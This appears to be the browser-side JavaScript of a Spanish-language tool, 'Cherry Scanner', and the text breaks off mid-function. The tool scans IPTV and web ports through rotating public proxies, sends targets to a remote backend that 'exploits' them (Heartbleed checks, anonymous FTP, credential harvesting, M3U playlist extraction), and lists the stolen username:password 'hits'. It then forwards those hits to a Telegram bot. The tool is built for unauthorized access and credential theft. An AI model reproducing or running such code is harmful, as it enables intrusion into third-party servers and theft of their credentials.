// ===== CONFIGURACIÓN =====
const API_BASE = 'https://cherry-scanner-v2.onrender.com/api';
let scanState = {
    isScanning: false,
    isExploiting: false,
    results: [],
    openPorts: [],
    vulnerablePorts: [],
    credentials: [],
    hits: [],
    mirrors: [],
    currentHost: '',
    scanHistory: [],
    loadedFileData: { server: null, targets: [], fileName: null, rawContent: null, servers: [] },
    proxyPool: [], proxyIndex: 0, proxyEnabled: false,
    networkInterceptor: { active: false, connections: [], ips: new Set() },
    sniResults: [],
    scanProgress: { total:0, processed:0, startTime:null, currentPort:0, speed:0, eta:'--:--' },
    exploitProgress: { total:0, processed:0, startTime:null, currentPort:0, found:0 },
    config: {
        timeout: 3,
        threads: 100,
        proxies: '',
        endpoints: ''
    }
};

const PORT_CATEGORIES = {
    web: [80,443,8080,8443,8880,8888,8081,8082,8083,8084,8085,8000,8008,8010],
    iptv: [25461,25462,25463,25464,25465,25466,25467,25468,25469,25470,25500,25501,25502,2082,2083,2086,2087,2095,2096]
};

const PUBLIC_PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt"
];

// Elementos del DOM
const elements = {
    host: document.getElementById('host'),
    ports: document.getElementById('ports'),
    scanBtn: document.getElementById('scanBtn'),
    vulnFileInput: document.getElementById('vulnFileInput'),
    fileUploadArea: document.getElementById('fileUploadArea'),
    filePreview: document.getElementById('filePreview'),
    fileName: document.getElementById('fileName'),
    fileStats: document.getElementById('fileStats'),
    xstreamBtn: document.getElementById('xstreamBtn'),
    brutaBtn: document.getElementById('brutaBtn'),
    espejosBtn: document.getElementById('espejosBtn'),
    scanProgressBar: document.getElementById('scanProgressBar'),
    scanProgressText: document.getElementById('scanProgressText'),
    scanSpeed: document.getElementById('scanSpeed'),
    scanEta: document.getElementById('scanEta'),
    scanProcessed: document.getElementById('scanProcessed'),
    scanTotal: document.getElementById('scanTotal'),
    statTotal: document.getElementById('statTotal'),
    statOpen: document.getElementById('statOpen'),
    statVuln: document.getElementById('statVuln'),
    statHits: document.getElementById('statHits'),
    vulnFilter: document.getElementById('vulnFilter'),
    vulnPortsContainer: document.getElementById('vulnPortsContainer'),
    vulnCount: document.getElementById('vulnCount'),
    exploitSelectedBtn: document.getElementById('exploitSelectedBtn'),
    exploitAllBtn: document.getElementById('exploitAllBtn'),
    recentHitsList: document.getElementById('recentHitsList'),
    recentHitsCount: document.getElementById('recentHitsCount'),
    exportHitsCheck: document.getElementById('exportHitsCheck'),
    exportScanCheck: document.getElementById('exportScanCheck'),
    exportBothCheck: document.getElementById('exportBothCheck'),
    telegramToken: document.getElementById('telegramToken'),
    telegramChatId: document.getElementById('telegramChatId'),
    saveTelegramBtn: document.getElementById('saveTelegramBtn'),
    heartbleedPort: document.getElementById('heartbleedPort'),
    heartbleedBtn: document.getElementById('heartbleedBtn'),
    m3uUrl: document.getElementById('m3u_url'),
    extractM3UBtn: document.getElementById('extractM3UBtn'),
    sniDomain: document.getElementById('sniDomain'),
    sniBtn: document.getElementById('sniBtn'),
    verifyUser: document.getElementById('verifyUser'),
    verifyPass: document.getElementById('verifyPass'),
    verifyBtn: document.getElementById('verifyBtn'),
    m3uServerHost: document.getElementById('m3uServerHost'),
    m3uServerPort: document.getElementById('m3uServerPort'),
    scanM3UServerBtn: document.getElementById('scanM3UServerBtn'),
    portsFilter: document.getElementById('portsFilter'),
    portsList: document.getElementById('portsList'),
    portsCount: document.getElementById('portsCount'),
    vulnList: document.getElementById('vulnList'),
    hitsList: document.getElementById('hitsList'),
    historyList: document.getElementById('historyList'),
    historyCount: document.getElementById('historyCount'),
    settingsBtn: document.getElementById('settingsBtn'),
    clearFieldsBtn: document.getElementById('clearFieldsBtn'),
    clearDataBtn: document.getElementById('clearDataBtn'),
    stopScanBtn: document.getElementById('stopScanBtn'),
    useProxyCheck: document.getElementById('useProxyCheck'),
    interceptorCheck: document.getElementById('interceptorCheck'),
    settingsModal: document.getElementById('settingsModal'),
    modalClose: document.querySelector('.modal-close'),
    configTimeout: document.getElementById('configTimeout'),
    configThreads: document.getElementById('configThreads'),
    configProxies: document.getElementById('configProxies'),
    saveSettingsBtn: document.getElementById('saveSettingsBtn'),
    cancelSettingsBtn: document.getElementById('cancelSettingsBtn'),
    liveResults: document.getElementById('liveResults'),
    statsChart: document.getElementById('statsChart')
};

// ===== FUNCIONES DE UTILIDAD =====
function showNotification(msg, type = 'info') {
    const toast = document.createElement('div');
    toast.style.cssText = `
        position: fixed; bottom: 20px; right: 20px; padding: 12px 20px;
        background: ${type === 'error' ? '#C62E3B' : type === 'success' ? '#28A745' : '#D4AF37'};
        color: white; border-radius: 30px; box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        z-index: 9999; font-weight: 600; animation: slideIn 0.3s;
    `;
    toast.textContent = msg;
    document.body.appendChild(toast);
    setTimeout(() => {
        toast.style.animation = 'slideOut 0.3s';
        setTimeout(() => document.body.removeChild(toast), 300);
    }, 3000);
}

function copyToClipboard(text) {
    navigator.clipboard.writeText(text)
        .then(() => showNotification('✅ Copiado', 'success'))
        .catch(() => showNotification('❌ Error al copiar', 'error'));
}

// ===== FUNCIONES DE CARGA DE PUERTOS =====
window.loadAllPorts = function() {
    const all = [80,81,88,443,444,8080,8443,8880,8888,8081,8082,8083,8084,8085,2095,2096,2082,2083,2086,2087,2052,2053,8000,8001,8002,8008,8010,8020,8030,8040,8050,8060,8070,8080,8090,25461,25462,25463,25464,25465,25466,25467,25468,25469,25470,25500,25501,25502,5000,5001,5002,5003,6001,6002,6003,7001,7002,7003,8880,8881,8882,8883,8884,8885,8886,8887,8888,8889,9990,9991,9992,9993,9994,9995,9996,9997,9998,9999,10000,10001,10002,10003,10004,10005,11000,12000,13000,14000,15000,20000,21000,22000,23000,24000,25000,26000,27000,28000,29000,30000];
    if (elements.ports) elements.ports.value = all.join(',');
    showNotification('📋 Cargados TODOS los puertos', 'success');
};

window.loadWebPorts = function() {
    if (elements.ports) elements.ports.value = PORT_CATEGORIES.web.join(',');
    showNotification('📋 Puertos WEB cargados', 'success');
};

window.loadIPTVPorts = function() {
    if (elements.ports) elements.ports.value = PORT_CATEGORIES.iptv.join(',');
    showNotification('📋 Puertos IPTV cargados', 'success');
};

// ===== ARCHIVO VULNERABLE =====
function initFileUpload() {
    if (elements.vulnFileInput) {
        elements.vulnFileInput.addEventListener('change', handleFileSelect);
    }
}

function handleFileSelect(e) {
    const file = e.target.files[0];
    if (!file) return;
    
    scanState.loadedFileData.fileName = file.name;
    const reader = new FileReader();
    
    reader.onload = (ev) => {
        const content = ev.target.result;
        scanState.loadedFileData.rawContent = content;
        parseVulnerableFile(content);
        showFilePreview(file.name);
    };
    
    reader.readAsText(file);
}

function parseVulnerableFile(content) {
    const lines = content.split('\n');
    let serverUrl = null;
    let targets = [];
    let servers = [];
    let currentServer = null;
    
    lines.forEach(l => {
        l = l.trim();
        
        if (l.includes('Server➲') || l.includes('🌐Server➲')) {
            let m = l.match(/Server➲\s*(.*)/i) || l.match(/🌐Server➲\s*(.*)/i);
            if (m) {
                serverUrl = m[1].trim();
                currentServer = { url: serverUrl, ips: [] };
                servers.push(currentServer);
            }
        }
        
        if (l.includes('✅') && l.includes(':')) {
            let m = l.match(/✅\s*([0-9.]+:[0-9]+)/);
            if (m) {
                targets.push(m[1]);
                if (currentServer) {
                    currentServer.ips.push(m[1]);
                }
            } else {
                let ipm = l.match(/([0-9.]+:[0-9]+)/);
                if (ipm) {
                    targets.push(ipm[1]);
                    if (currentServer) {
                        currentServer.ips.push(ipm[1]);
                    }
                }
            }
        }
        
        let ipm = l.match(/([0-9.]+:[0-9]+)/);
        if (ipm && !l.includes('✅')) {
            targets.push(ipm[1]);
        }
    });
    
    scanState.loadedFileData.targets = [...new Set(targets)];
    scanState.loadedFileData.server = serverUrl;
    scanState.loadedFileData.servers = servers;
    
    if (serverUrl && elements.host) {
        elements.host.value = serverUrl;
    }
    
    updateFileStats();
    showNotification(`📋 Archivo procesado: ${scanState.loadedFileData.targets.length} objetivos`, 'success');
}

function updateFileStats() {
    if (!elements.fileStats) return;
    
    let html = '';
    let d = scanState.loadedFileData;
    
    if (d.fileName) {
        html += `<div class="stat-row"><i class="fas fa-file-alt"></i> <strong>${d.fileName}</strong></div>`;
    }
    
    if (d.server) {
        html += `<div class="stat-row"><i class="fas fa-server"></i> Servidor: ${d.server}</div>`;
    }
    
    if (d.servers && d.servers.length) {
        d.servers.forEach(s => {
            if (s.url) {
                html += `<div class="stat-row"><i class="fas fa-globe"></i> Servidor: ${s.url}</div>`;
            }
            if (s.ips && s.ips.length) {
                s.ips.forEach(ip => {
                    html += `<div class="target-item"><i class="fas fa-chevron-right"></i> ${ip}</div>`;
                });
            }
        });
    }
    
    if (d.targets && d.targets.length) {
        html += `<div class="stat-row"><i class="fas fa-bug"></i> Total objetivos: <strong>${d.targets.length}</strong></div>`;
    }
    
    elements.fileStats.innerHTML = html || '<div class="empty-message">No se encontraron objetivos</div>';
}

function showFilePreview(name) {
    if (elements.filePreview && elements.fileName && elements.fileUploadArea) {
        elements.fileName.textContent = name;
        elements.filePreview.style.display = 'block';
        elements.fileUploadArea.style.display = 'none';
    }
}

window.clearFile = function() {
    scanState.loadedFileData = { server: null, targets: [], fileName: null, rawContent: null, servers: [] };
    if (elements.filePreview) elements.filePreview.style.display = 'none';
    if (elements.fileUploadArea) elements.fileUploadArea.style.display = 'block';
    if (elements.vulnFileInput) elements.vulnFileInput.value = '';
    if (elements.fileStats) elements.fileStats.innerHTML = '';
    showNotification('🧹 Archivo eliminado', 'info');
};

// ===== PROXIES =====
async function loadProxies() {
    showNotification('🔄 Cargando proxies...', 'info');
    scanState.proxyPool = [];
    
    for (let src of PUBLIC_PROXY_SOURCES) {
        try {
            let r = await fetch(src, { timeout: 5000 });
            if (r.ok) {
                let txt = await r.text();
                let prox = txt.split('\n').map(l => l.trim()).filter(l => l && l.includes(':'));
                scanState.proxyPool.push(...prox);
            }
        } catch (e) {}
    }
    
    scanState.proxyPool = [...new Set(scanState.proxyPool)];
    
    if (scanState.proxyPool.length) {
        scanState.proxyEnabled = true;
        if (elements.useProxyCheck) elements.useProxyCheck.checked = true;
        showNotification(`✅ ${scanState.proxyPool.length} proxies cargados`, 'success');
    } else {
        showNotification('⚠️ No se pudieron cargar proxies', 'warning');
    }
}

function getNextProxy() {
    if (!scanState.proxyEnabled || !scanState.proxyPool.length) return null;
    return scanState.proxyPool[scanState.proxyIndex++ % scanState.proxyPool.length];
}

// ===== NETWORK INTERCEPTOR =====
let originalFetch = window.fetch;

function startNetworkInterceptor() {
    scanState.networkInterceptor.active = true;
    scanState.networkInterceptor.connections = [];
    scanState.networkInterceptor.ips.clear();
    
    window.fetch = async function(...args) {
        try {
            let url = args[0] instanceof Request ? args[0].url : args[0];
            let parsed = new URL(url);
            if (parsed.hostname && /^\d+\.\d+\.\d+\.\d+$/.test(parsed.hostname)) {
                scanState.networkInterceptor.connections.push(`${parsed.hostname}:${parsed.port || 80}`);
                scanState.networkInterceptor.ips.add(parsed.hostname);
            }
            return originalFetch.apply(this, args);
        } catch (e) {
            return originalFetch.apply(this, args);
        }
    };
}

function stopNetworkInterceptor() {
    scanState.networkInterceptor.active = false;
    window.fetch = originalFetch;
}

// ===== ESCANEO PRINCIPAL =====
async function startScan() {
    if (scanState.loadedFileData.targets.length && confirm(`¿Usar los ${scanState.loadedFileData.targets.length} objetivos del archivo?`)) {
        await scanFileTargets();
        return;
    }
    await normalScan();
}

async function normalScan() {
    let host = elements.host?.value.trim();
    let ports = elements.ports?.value.trim();
    
    if (!host) {
        showNotification('❌ Servidor requerido', 'error');
        return;
    }
    if (!ports) {
        showNotification('❌ Puertos requeridos', 'error');
        return;
    }
    
    if (elements.interceptorCheck?.checked) startNetworkInterceptor();
    
    // Resetear UI
    resetUIForNewScan();
    
    scanState.currentHost = host;
    scanState.isScanning = true;
    scanState.results = [];
    scanState.vulnerablePorts = [];
    
    let portList = ports.split(',').map(p => parseInt(p.trim()));
    scanState.scanProgress = { total: portList.length, processed: 0, startTime: Date.now(), currentPort: 0, speed: 0, eta: '--:--' };
    
    if (elements.scanBtn) elements.scanBtn.disabled = true;
    if (elements.scanTotal) elements.scanTotal.textContent = portList.length;
    
    addLiveResult(`🔍 INICIANDO ESCANEO DE ${host}`, 'info');
    addLiveResult(`📋 Puertos: ${portList.length}`, 'info');
    
    try {
        const batchSize = 20;
        for (let i = 0; i < portList.length; i += batchSize) {
            if (!scanState.isScanning) break;
            
            let batch = portList.slice(i, i + batchSize);
            scanState.scanProgress.currentPort = batch[0];
            
            let proxy = (elements.useProxyCheck?.checked) ? getNextProxy() : null;
            
            let resp = await fetch(`${API_BASE}/scan`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ host, ports: batch.join(','), proxy })
            });
            
            let data = await resp.json();
            
            if (data.results) {
                scanState.results = scanState.results.concat(data.results);
                data.results.forEach(r => {
                    if (r.open) {
                        addLiveResult(`📡 Puerto ${r.port}: ABIERTO ${r.vulnerable ? '🔥' : ''} (${r.service})`, 'success');
                        if (r.vulnerable) {
                            scanState.vulnerablePorts.push({
                                host,
                                port: r.port,
                                service: r.service,
                                banner: r.banner || '',
                                login: null
                            });
                        }
                    }
                });
            }
            
            scanState.scanProgress.processed += batch.length;
            updateScanStats();
        }
        
        addLiveResult(`✅ ESCANEO COMPLETADO`, 'success');
        let openCount = scanState.results.filter(r => r.open).length;
        addLiveResult(`📊 Abiertos: ${openCount} | Vulnerables: ${scanState.vulnerablePorts.length}`, 'info');
        
        addToHistory(host, portList.length, openCount, scanState.vulnerablePorts.length);
        displayVulnerablePorts(scanState.vulnerablePorts);
        updateStats();
        updateExploitButtons();
        renderPortsList();
        renderVulnList();
        
    } catch (e) {
        showNotification(`❌ Error: ${e.message}`, 'error');
        addLiveResult(`❌ ${e.message}`, 'error');
    } finally {
        scanState.isScanning = false;
        if (elements.scanBtn) elements.scanBtn.disabled = false;
        stopNetworkInterceptor();
        if (elements.scanProgressBar) elements.scanProgressBar.style.width = '100%';
        if (elements.scanProgressText) elements.scanProgressText.textContent = '100%';
    }
}

async function scanFileTargets() {
    let targets = scanState.loadedFileData.targets || [];
    
    if (!targets.length) {
        showNotification('❌ No hay objetivos en el archivo', 'error');
        return;
    }
    
    if (elements.interceptorCheck?.checked) startNetworkInterceptor();
    
    // Resetear UI
    resetUIForNewScan();
    
    let fileName = scanState.loadedFileData.fileName || 'Archivo';
    let serverName = scanState.loadedFileData.server || 'múltiples';
    scanState.currentHost = `📁 ${fileName} (${serverName})`;
    
    scanState.isScanning = true;
    scanState.results = [];
    scanState.vulnerablePorts = [];
    
    scanState.scanProgress = {
        total: targets.length,
        processed: 0,
        startTime: Date.now(),
        currentPort: 0,
        speed: 0,
        eta: '--:--'
    };
    
    if (elements.scanBtn) elements.scanBtn.disabled = true;
    if (elements.scanTotal) elements.scanTotal.textContent = targets.length;
    
    addLiveResult(`🔍 PROCESANDO ${targets.length} OBJETIVOS DEL ARCHIVO`, 'info');
    
    targets.forEach((t, idx) => {
        let [ip, port] = t.split(':');
        addLiveResult(`   📍 ${idx+1}. ${ip}:${port}`, 'info');
    });
    
    let vulnTargets = targets.map(t => {
        let [ip, port] = t.split(':');
        return { 
            host: ip, 
            port: parseInt(port), 
            service: 'Del archivo',
            banner: '',
            login: null 
        };
    });
    
    scanState.vulnerablePorts = vulnTargets;
    displayVulnerablePorts(vulnTargets);
    updateStats();
    
    for (let i = 1; i <= targets.length; i++) {
        if (!scanState.isScanning) break;
        
        scanState.scanProgress.processed = i;
        scanState.scanProgress.currentPort = parseInt(targets[i-1].split(':')[1]);
        updateScanStats();
        
        await new Promise(r => setTimeout(r, 50));
    }
    
    addLiveResult(`✅ ${vulnTargets.length} objetivos cargados en lista de vulnerables`, 'success');
    
    addToHistory(
        `📁 ${fileName}`, 
        targets.length, 
        0, 
        vulnTargets.length
    );
    
    scanState.isScanning = false;
    if (elements.scanBtn) elements.scanBtn.disabled = false;
    stopNetworkInterceptor();
    updateExploitButtons();
    renderVulnList();
    
    if (elements.scanProgressBar) elements.scanProgressBar.style.width = '100%';
    if (elements.scanProgressText) elements.scanProgressText.textContent = '100%';
    if (elements.scanSpeed) elements.scanSpeed.textContent = targets.length.toFixed(1);
    
    addLiveResult(`✨ LISTO PARA EXPLOTAR ${vulnTargets.length} OBJETIVOS`, 'success');
}

function resetUIForNewScan() {
    // Limpiar resultados anteriores
    if (elements.vulnPortsContainer) {
        elements.vulnPortsContainer.innerHTML = '<div class="empty"><i class="fas fa-search"></i> No hay puertos vulnerables</div>';
    }
    if (elements.portsList) elements.portsList.innerHTML = '';
    if (elements.vulnList) elements.vulnList.innerHTML = '';
    
    // Resetear barras de progreso
    if (elements.scanProgressBar) elements.scanProgressBar.style.width = '0%';
    if (elements.scanProgressText) elements.scanProgressText.textContent = '0%';
    if (elements.scanSpeed) elements.scanSpeed.textContent = '0';
    if (elements.scanEta) elements.scanEta.textContent = '--:--';
    if (elements.scanProcessed) elements.scanProcessed.textContent = '0';
}

// ===== FUNCIÓN addLiveResult MEJORADA CON ICONOS ELEGANTES =====
function addLiveResult(msg, type = 'info') {
    if (!elements.liveResults) return;
    
    let item = document.createElement('div');
    item.className = 'live-result-item';
    
    // Iconos elegantes por tipo
    let icon = 'fa-circle-info';
    let iconColor = '#C62E3B'; // Cherry por defecto
    
    switch(type) {
        case 'error':
            icon = 'fa-circle-exclamation';
            iconColor = '#C62E3B';
            item.classList.add('error');
            break;
        case 'success':
            icon = 'fa-circle-check';
            iconColor = '#28A745';
            item.classList.add('success');
            break;
        case 'cred':
            icon = 'fa-key';
            iconColor = '#D4AF37'; // Dorado
            item.classList.add('cred');
            break;
        case 'warning':
            icon = 'fa-triangle-exclamation';
            iconColor = '#FFA500';
            item.classList.add('warning');
            break;
        case 'mirror':
            icon = 'fa-clone';
            iconColor = '#C62E3B';
            item.classList.add('mirror');
            break;
        case 'hit':
            icon = 'fa-crown';
            iconColor = '#D4AF37';
            item.classList.add('hit');
            break;
        case 'info':
        default:
            icon = 'fa-circle-info';
            iconColor = '#C62E3B';
            break;
    }
    
    item.innerHTML = `<i class="fas ${icon}" style="color:${iconColor}; margin-right:10px;"></i> ${msg}`;
    elements.liveResults.appendChild(item);
    elements.liveResults.scrollTop = elements.liveResults.scrollHeight;
}

// ===== ESTADÍSTICAS DE ESCANEO =====
let scanStatsInterval;

function startScanStats() {
    if (scanStatsInterval) clearInterval(scanStatsInterval);
    scanStatsInterval = setInterval(() => {
        if (scanState.isScanning) updateScanStats();
    }, 500);
}

function updateScanStats() {
    let p = scanState.scanProgress;
    if (!p || p.total === 0) return;
    
    let elapsed = (Date.now() - p.startTime) / 1000;
    p.speed = elapsed > 0 ? p.processed / elapsed : 0;
    let remaining = p.total - p.processed;
    let etaSecs = p.speed > 0 ? remaining / p.speed : 0;
    let etaM = Math.floor(etaSecs / 60);
    let etaS = Math.floor(etaSecs % 60);
    p.eta = `${etaM}:${etaS.toString().padStart(2, '0')}`;
    
    let percent = Math.min(100, Math.round((p.processed / p.total) * 100));
    
    if (elements.scanProgressBar) elements.scanProgressBar.style.width = percent + '%';
    if (elements.scanProgressText) elements.scanProgressText.textContent = percent + '%';
    if (elements.scanSpeed) elements.scanSpeed.textContent = p.speed.toFixed(1);
    if (elements.scanEta) elements.scanEta.textContent = p.eta;
    if (elements.scanProcessed) elements.scanProcessed.textContent = p.processed;
}

// ===== PUERTOS VULNERABLES =====
function displayVulnerablePorts(ports) {
    if (!elements.vulnPortsContainer) return;
    
    if (!ports || !ports.length) {
        elements.vulnPortsContainer.innerHTML = '<div class="empty"><i class="fas fa-search"></i> No hay puertos vulnerables</div>';
        if (elements.vulnCount) elements.vulnCount.textContent = '0';
        updateExploitButtons();
        return;
    }
    
    let html = '';
    ports.forEach((p, idx) => {
        html += `<div class="vuln-item">
            <input type="checkbox" class="vuln-checkbox" data-host="${p.host}" data-port="${p.port}" id="vuln-${idx}">
            <i class="fas fa-fire" style="color:#C62E3B;"></i>
            <label for="vuln-${idx}">${p.host}:${p.port} - ${p.service}</label>
        </div>`;
    });
    
    elements.vulnPortsContainer.innerHTML = html;
    if (elements.vulnCount) elements.vulnCount.textContent = ports.length;
    updateExploitButtons();
}

function updateExploitButtons() {
    let anySelected = document.querySelectorAll('.vuln-checkbox:checked').length > 0;
    if (elements.exploitSelectedBtn) elements.exploitSelectedBtn.disabled = !anySelected;
    if (elements.exploitAllBtn) elements.exploitAllBtn.disabled = (scanState.vulnerablePorts.length === 0);
}

document.addEventListener('change', (e) => {
    if (e.target.classList.contains('vuln-checkbox')) {
        updateExploitButtons();
    }
});

// ===== RENDERIZADO DE LISTAS =====
function renderPortsList() {
    if (!elements.portsList) return;
    let filter = elements.portsFilter?.value.toLowerCase() || '';
    let filtered = scanState.results.filter(r =>
        r.port.toString().includes(filter) ||
        (r.service && r.service.toLowerCase().includes(filter))
    );
    
    if (!filtered.length) {
        elements.portsList.innerHTML = '<div class="empty">No hay resultados</div>';
        if (elements.portsCount) elements.portsCount.textContent = '0';
        return;
    }
    
    let html = '';
    filtered.slice(0, 15).forEach(r => {
        html += `<div class="port-item">
            <span><i class="fas fa-${r.open ? 'check-circle' : 'times-circle'}" style="color:${r.open ? '#28A745' : '#C62E3B'};"></i> Puerto ${r.port}</span>
            <span>${r.service}</span>
        </div>`;
    });
    
    elements.portsList.innerHTML = html;
    if (elements.portsCount) elements.portsCount.textContent = filtered.length;
}

function renderVulnList() {
    if (!elements.vulnList) return;
    let filtered = scanState.vulnerablePorts.slice(0, 10);
    
    if (!filtered.length) {
        elements.vulnList.innerHTML = '<div class="empty">No hay vulnerables</div>';
        return;
    }
    
    let html = '';
    filtered.forEach(p => {
        html += `<div class="vuln-item" style="border-left-color:#C62E3B;">
            <i class="fas fa-fire" style="color:#C62E3B;"></i> ${p.host}:${p.port} - ${p.service}
        </div>`;
    });
    
    elements.vulnList.innerHTML = html;
}

function renderHitsList() {
    if (!elements.hitsList) return;
    let hits = scanState.hits.slice(-10).reverse();
    
    if (!hits.length) {
        elements.hitsList.innerHTML = '<div class="empty">No hay hits</div>';
        return;
    }
    
    let html = '';
    hits.forEach(h => {
        html += `<div class="vuln-item" style="border-left-color:#D4AF37;">
            <i class="fas fa-trophy" style="color:#D4AF37;"></i> ${h.host}:${h.port} - ${h.username}:${h.password}
        </div>`;
    });
    
    elements.hitsList.innerHTML = html;
}

// ===== EXPLOTAR =====
async function exploitSelected() {
    let selected = [];
    document.querySelectorAll('.vuln-checkbox:checked').forEach(cb => {
        selected.push({
            host: cb.dataset.host,
            port: parseInt(cb.dataset.port)
        });
    });
    
    if (!selected.length) {
        showNotification('❌ No hay puertos seleccionados', 'error');
        return;
    }
    await exploitPorts(selected);
}

async function exploitAll() {
    if (!scanState.vulnerablePorts.length) {
        showNotification('❌ No hay puertos vulnerables', 'error');
        return;
    }
    let all = scanState.vulnerablePorts.map(p => ({ host: p.host, port: p.port }));
    await exploitPorts(all);
}

async function exploitPorts(ports) {
    scanState.isExploiting = true;
    let newCreds = [];
    
    for (let p of ports) {
        addLiveResult(`\n🔍 Explotando ${p.host}:${p.port}...`, 'info');
        try {
            let proxy = (elements.useProxyCheck?.checked) ? getNextProxy() : null;
            
            let r = await fetch(`${API_BASE}/deep-analyze`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ host: p.host, port: p.port, proxy })
            });
            
            let d = await r.json();
            
            if (d.success) {
                let res = d.results;
                
                if (res.heartbleed) addLiveResult(`   ✅ Heartbleed VULNERABLE!`, 'success');
                
                if (res.ftp) {
                    if (res.ftp.anonymous) addLiveResult(`   🔓 FTP anónimo permitido!`, 'success');
                    if (res.ftp.creds) {
                        addLiveResult(`   🔑 FTP: ${res.ftp.creds.username}:${res.ftp.creds.password}`, 'cred');
                        newCreds.push(res.ftp.creds);
                    }
                }
                
                if (res.http && res.http.m3u_files && res.http.m3u_files.length) {
                    addLiveResult(`   📁 M3U encontrados: ${res.http.m3u_files.join(', ')}`, 'success');
                }
                
                if (res.credentials && res.credentials.length) {
                    res.credentials.forEach(c => {
                        addLiveResult(`   🔑 ${c.username}:${c.password}`, 'cred');
                        newCreds.push(c);
                    });
                }
                
                if (res.m3u_found && res.m3u_found.length) {
                    res.m3u_found.forEach(m => {
                        addLiveResult(`   📁 M3U: ${m.url}`, 'success');
                    });
                }
                
                if (res.vulnerabilities && res.vulnerabilities.length) {
                    res.vulnerabilities.forEach(v => {
                        addLiveResult(`   🔥 ${v.type} - ${v.cve}`, 'warning');
                    });
                }
            }
        } catch (e) {
            addLiveResult(`   ❌ Error`, 'error');
        }
    }
    
    if (newCreds.length) {
        scanState.credentials = scanState.credentials.concat(newCreds);
        showNotification(`✅ ${newCreds.length} credenciales encontradas`, 'success');
    }
    
    scanState.isExploiting = false;
    updateStats();
}

// ===== FORMATOS DE HIT PARA TELEGRAM Y TXT =====
function formatHitForTelegram(hit) {
    const lines = [];
    
    // Línea superior decorativa
    lines.push('╔══════════════════════════════════════╗');
    lines.push('║     🍒 CHERRY SCANNER - HIT 🍒      ║');
    lines.push('╠══════════════════════════════════════╣');
    
    // Información del servidor
    lines.push(`║ 📌 Servidor: ${hit.host}:${hit.port}`);
    lines.push(`║ 🔐 Usuario: ${hit.username}`);
    lines.push(`║ 🔑 Contraseña: ${hit.password}`);
    
    // Fecha de expiración
    if (hit.exp_date) {
        const expDate = hit.exp_date === 'Unlimited' ? 'Ilimitado' : new Date(parseInt(hit.exp_date) * 1000).toLocaleString();
        lines.push(`║ ⏰ Expira: ${expDate}`);
    }
    
    // Enlace M3U si existe
    if (hit.m3u_url) {
        lines.push(`║ 📁 M3U: ${hit.m3u_url}`);
    }
    
    // Método de obtención
    if (hit.method) {
        lines.push(`║ 🛠️ Método: ${hit.method}`);
    }
    
    // Línea inferior decorativa
    lines.push('╚══════════════════════════════════════╝');
    
    return lines.join('\n');
}

function formatHitForTXT(hit) {
    const lines = [];
    
    lines.push('🍒 ᘻ3SSᗩ10 CHERRY HIT 🍒');
    lines.push('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    lines.push(`📌 Host: ${hit.host}:${hit.port}`);
    lines.push(`👤 Usuario: ${hit.username}`);
    lines.push(`🔑 Password: ${hit.password}`);
    
    if (hit.exp_date) {
        const expDate = hit.exp_date === 'Unlimited' ? 'Ilimitado' : new Date(parseInt(hit.exp_date) * 1000).toLocaleString();
        lines.push(`⏰ Expira: ${expDate}`);
    }
    
    if (hit.m3u_url) {
        lines.push(`📁 M3U: ${hit.m3u_url}`);
    }
    
    lines.push('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    
    return lines.join('\n');
}

// ===== HITS MEJORADOS =====
function addHitToUI(hit) {
    scanState.hits.push(hit);
    
    // Mostrar en resultados en vivo con formato elegante
    addLiveResult(`🎯 HIT ENCONTRADO en ${hit.host}:${hit.port}`, 'hit');
    addLiveResult(`   └─ 👤 Usuario: ${hit.username}`, 'cred');
    addLiveResult(`   └─ 🔑 Password: ${hit.password}`, 'cred');
    
    if (hit.m3u_url) {
        addLiveResult(`   └─ 📁 M3U: ${hit.m3u_url}`, 'success');
    }
    
    updateStats();
    updateRecentHits();
    renderHitsList();
    showNotification('🎯 Nuevo hit encontrado!', 'success');
}

function updateRecentHits() {
    if (!elements.recentHitsList) return;
    let hits = scanState.hits.slice(-5).reverse();
    
    if (!hits.length) {
        elements.recentHitsList.innerHTML = '<div class="empty"><i class="fas fa-search"></i> No hay hits aún</div>';
        if (elements.recentHitsCount) elements.recentHitsCount.textContent = '0';
        return;
    }
    
    let html = '';
    hits.forEach(h => {
        let hitStr = JSON.stringify(h).replace(/'/g, "&#39;");
        html += `<div class="recent-hit-item">
            <span class="hit-info" title="${h.host}:${h.port} - ${h.username}:${h.password}">
                ${h.host}:${h.port} - ${h.username}:${h.password}
            </span>
            <div class="hit-actions">
                <button class="btn-icon-small" onclick="copyToClipboard('${h.username}:${h.password}')" title="Copiar creds">
                    <i class="far fa-copy"></i>
                </button>
                <button class="btn-icon-small send-tg" data-hit='${hitStr}' title="Enviar a Telegram">
                    <i class="fab fa-telegram"></i>
                </button>
            </div>
        </div>`;
    });
    
    elements.recentHitsList.innerHTML = html;
    if (elements.recentHitsCount) elements.recentHitsCount.textContent = scanState.hits.length;
    
    document.querySelectorAll('.recent-hit-item .send-tg').forEach(btn => {
        btn.addEventListener('click', (e) => {
            let hitData = e.currentTarget.dataset.hit;
            try {
                let hit = JSON.parse(hitData.replace(/&#39;/g, "'"));
                sendSingleHitToTelegram(hit);
            } catch (err) {
                showNotification('Error al enviar hit', 'error');
            }
        });
    });
}

// ===== ENVÍO A TELEGRAM CON FORMATO ELEGANTE =====
function sendSingleHitToTelegram(hit) {
    // Usar valores guardados o los del input
    let token = localStorage.getItem('cherryTelegramToken') || elements.telegramToken?.value.trim();
    let chatId = localStorage.getItem('cherryTelegramChatId') || elements.telegramChatId?.value.trim();
    
    if (!token || !chatId) {
        showNotification('❌ Token y Chat ID requeridos (guárdalos primero)', 'error');
        return;
    }
    
    let msg = formatHitForTelegram(hit);
    
    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            chat_id: chatId, 
            text: msg,
            parse_mode: 'HTML'
        })
    })
